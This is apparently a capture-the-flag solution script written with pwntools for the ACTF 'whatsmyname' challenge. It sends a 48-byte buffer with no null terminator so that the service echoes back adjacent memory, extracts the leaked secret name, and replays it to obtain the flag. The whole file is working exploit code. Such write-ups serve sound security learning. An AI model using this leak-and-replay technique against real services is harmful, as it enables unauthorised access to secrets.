from pwn import *
context.log_level = 'DEBUG'
io = remote('challs.actf.co', 31223)
context.binary = elf = ELF('whatsmyname')

payload = b'A' * 48  # no null byte
io.send(payload)
r = io.recvline()
print('Raw:', r)
r = r.split(b'A')[-1].strip(b'!\n').strip()
print('Leaked bytes:', r)
r = r[:47]  # fgets() only read up to 48-1 bytes as 1 is for null byte
print('Sending:', r)
assert len(r) == 47
io.recvuntil(b'Guess my name and you\'ll get a flag!')
io.sendline(r)
io.interactive()
